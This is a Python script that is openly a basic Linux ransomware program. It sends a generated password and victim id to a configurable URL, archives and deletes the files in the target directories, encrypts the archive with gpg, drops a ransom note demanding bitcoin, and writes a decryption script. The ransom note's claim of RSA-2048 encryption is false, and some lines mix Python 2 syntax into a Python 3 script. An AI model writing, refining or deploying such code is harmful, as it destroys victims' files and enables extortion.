
#!/usr/bin/python3

import os
import sys
import subprocess
import random
import string
import requests
import re

def linux():
	if (os.geteuid() == 0):
		directories.append('/root/')

	# Generate encryption password
	s = string.ascii_lowercase + string.digits
	pwd = str(''.join(random.sample(s, 30)))

	# Generate unique id
	t = string.ascii_lowercase
	tdd = str(''.join(random.sample(t, 10)))

	# Start encryption
	sendCred(url, pwd, tdd)
	crypt(directories, pwd)
	howto(directories, bitcoin, price)
	decryptGen(str(directories))


def sendCred(url, pwd, tdd):
	values = {'pass':pwd, 'id':tdd}
	r = requests.post(url, values)
	page = r.text
	if (page != 'Ok.'):
		sys.exit('Error sending credentials')

def crypt(directory, pwd):

	if (type(directory) != list):
		sys.exit('Wrong format!')

	for dirr in directory:
		os.chdir(dirr)
		os.system('tar cvf encrypted.tar *')
		os.system('find . ! -name encrypted.tar -type f -delete')
		os.system('find . ! -name encrypted.tar -type d -delete')
		os.system('echo ' + pwd + ' | gpg --passphrase-fd 0 -c encrypted.tar')
		os.system('rm encrypted.tar')
		os.chdir('../')
		print "------------------- "

def howto(directory, bitcoin, price):
	txt = "\n"
	txt += "Attention user:"
	txt += "All your computer files have been encrypted with a RSA-2048 certification\n"
	txt += "To get them back, you must pay: " + str(price) + "\n"
	txt += "My bitcoin address is: " + bitcoin + "\n"
	txt += "After you pay you will receive a password. Use decrypt.py file to recover your files\n"
	txt += "Have a nice day :)\n\n"
	file = open("instructions.txt", "wb")
	file.write(txt)
	file.close()
	for dirr in directory:
		os.system("cp 'instructions.txt' " + dirr)



def decryptGen(directory):
	txt = ""
	txt += "#!/usr/bin/python3\n"
	txt += "import os\nimport sys\n"
	txt += "directory = " + directory + "\n"
	txt += "pwd = raw_input('Password: ')\n"
	txt += "for dirr in directory:\n"
	txt += "	os.chdir(dirr)\n"
	txt += "	if (os.system('gpg --passphrase ' + pwd + ' -d encrypted.tar.gpg > unencrypted.tar') != 0):\n"
	txt += "		sys.exit('Incorrect password!')\n"
	txt += "	os.system('tar xvf unencrypted.tar')\n"
	txt += "	os.system('rm unencrypted.tar')\n"
	txt += "	os.system('rm encrypted.tar.gpg')\n"
	txt += "	os.system('rm instructions.txt')\n"
	txt += "	os.chdir('../')\n"
	file = open("decrypt.py", "wb")
	file.write(txt)
	file.close()



# Directories to encrypt
directories = ['~/Downloads']
bitcoin = 'bitcoin_address'
price = 3
url = 'localhost'

# Only linux
if (sys.platform == 'Linux' or sys.platform == 'linux2'):
	linux()
else:
	sys.exit("Only linux OS!")
